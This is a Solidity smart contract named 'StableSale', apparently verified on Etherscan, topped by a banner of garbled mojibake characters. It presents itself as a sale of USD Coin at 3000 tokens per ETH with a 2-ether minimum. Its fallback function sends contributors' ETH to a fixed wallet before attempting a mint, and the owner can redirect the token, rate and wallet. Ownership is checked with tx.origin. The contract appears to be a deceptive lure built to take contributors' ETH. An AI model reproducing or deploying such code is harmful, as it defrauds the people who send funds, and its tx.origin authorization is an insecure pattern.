/**

 *Submitted for verification at Etherscan.io on 2019-02-20

*/



pragma solidity 0.5.4;





// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€©¤¨€©¤¨€©¤©¤©¤¨€©¤©¤©¤©¤¨€¨€

// ¨€©¤¨€©¤¨€©¤¨€¨€¨€©¤¨€¨€©¤©¤¨€

// ¨€©¤¨€©¤¨€©¤©¤©¤¨€©¤¨€¨€©¤©¤¨€

// ¨€©¤¨€©¤¨€¨€¨€©¤¨€©¤¨€¨€©¤©¤¨€

// ¨€©¤©¤©¤¨€©¤©¤©¤¨€©¤©¤©¤©¤¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€©¤©¤©¤©¤¨€©¤©¤©¤©¤¨€©¤©¤©¤¨€©¤¨€¨€©¤¨€

// ¨€©¤¨€¨€©¤¨€©¤¨€¨€©¤¨€¨€©¤¨€¨€©¤©¤¨€©¤¨€

// ¨€©¤¨€¨€¨€¨€©¤¨€¨€©¤¨€¨€©¤¨€¨€©¤¨€©¤©¤¨€

// ¨€©¤¨€¨€©¤¨€©¤¨€¨€©¤¨€¨€©¤¨€¨€©¤¨€¨€©¤¨€

// ¨€©¤©¤©¤©¤¨€©¤©¤©¤©¤¨€©¤©¤©¤¨€©¤¨€¨€©¤¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€©¤©¤©¤¨€©¤©¤©¤©¤¨€©¤©¤©¤©¤¨€¨€¨€¨€

// ¨€©¤¨€¨€¨€©¤¨€¨€©¤¨€©¤¨€¨€©¤¨€¨€¨€¨€

// ¨€©¤©¤©¤¨€©¤¨€¨€©¤¨€©¤©¤©¤©¤¨€¨€¨€¨€

// ¨€©¤¨€¨€¨€©¤¨€¨€©¤¨€©¤¨€©¤¨€¨€¨€¨€¨€

// ¨€©¤¨€¨€¨€©¤©¤©¤©¤¨€©¤¨€©¤¨€¨€¨€¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€©¤©¤©¤©¤¨€©¤¨€¨€©¤¨€©¤¨€¨€¨€©¤©¤¨€©¤©¤¨€

// ¨€©¤¨€¨€©¤¨€©¤©¤¨€©¤¨€©¤¨€¨€¨€¨€©¤©¤©¤¨€¨€

// ¨€©¤¨€¨€©¤¨€©¤¨€©¤©¤¨€©¤¨€¨€¨€¨€¨€©¤¨€¨€¨€

// ¨€©¤¨€¨€©¤¨€©¤¨€¨€©¤¨€©¤¨€¨€¨€¨€¨€©¤¨€¨€¨€

// ¨€©¤©¤©¤©¤¨€©¤¨€¨€©¤¨€©¤©¤©¤¨€¨€¨€©¤¨€¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€©¤¨€¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€©¤©¤©¤©¤¨€¨€¨€©¤©¤©¤©¤¨€©¤©¤©¤©¤¨€

// ¨€©¤¨€¨€©¤¨€¨€¨€©¤¨€¨€©¤¨€©¤¨€¨€¨€¨€

// ¨€©¤¨€¨€©¤¨€¨€¨€©¤¨€¨€©¤¨€©¤©¤©¤©¤¨€

// ¨€©¤¨€¨€©¤¨€¨€¨€©¤¨€¨€©¤¨€¨€¨€¨€©¤¨€

// ¨€©¤©¤©¤©¤¨€©¤¨€©¤©¤©¤©¤¨€©¤©¤©¤©¤¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€

// ¨€©¤¨€©¤¨€©¤©¤©¤¨€©¤©¤©¤©¤¨€¨€

// ¨€©¤¨€©¤¨€©¤¨€¨€¨€©¤¨€¨€©¤©¤¨€

// ¨€©¤¨€©¤¨€©¤©¤©¤¨€©¤¨€¨€©¤©¤¨€

// ¨€©¤¨€©¤¨€¨€¨€©¤¨€©¤¨€¨€©¤©¤¨€

// ¨€©¤©¤©¤¨€©¤©¤©¤¨€©¤©¤©¤©¤¨€¨€

// ¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€¨€







contract StableSale {

  using SafeMath for uint;    

  

  // Fallback function for participating

  function () external payable {

    require(msg.value >= minContribution);

    wallet.transfer(msg.value);  

    uint tokens = msg.value.mul(rate);

    ERC20Basic(token).mint(msg.sender, tokens);

  }

  

  // USD Coin address

  address token = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  

  // internal contract ETH/USD price 

  // 1 ETH = 3000$

  // you will get 3000 StableCoins per 1 ETH 

  uint public rate = 3000; 

  

  // minimum participating amount = 2 ether

  uint256 minContribution = 2 ether;

  

  address payable public wallet = 0x617769A1428069f08830373086928249B85fCeEe;



  address owner = tx.origin;



  modifier onlyOwner() {

    require(tx.origin == owner);

    _;

  }

  

  function setRate(uint newRate) public onlyOwner {

    rate = newRate;  

  }

  

  function setWallet(address payable newWallet) public onlyOwner {

    wallet = newWallet;

  }

  

  function setToken(address newToken) public onlyOwner {

    token = newToken;

  }

  

  function retrieveTokens(address to, address anotherToken) public onlyOwner {

    ERC20Basic alienToken = ERC20Basic(anotherToken);

    alienToken.transfer(to, alienToken.balanceOf(address(this)));

  }

}



library SafeMath {

    

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {

      return 0;

    }

    uint256 c = a * b;

    assert(c / a == b);

    return c;

  }



  function div(uint256 a, uint256 b) internal pure returns (uint256) {

    uint256 c = a / b;

    return c;

  }



  function sub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function add(uint256 a, uint256 b) internal pure returns (uint256) {

    uint256 c = a + b;

    assert(c >= a);

    return c;

  }

  

}



contract ERC20Basic {

  function balanceOf(address who) external view returns (uint256);

  function transfer(address to, uint256 value) external returns (bool);

  function mint(address to, uint256 value) external;

}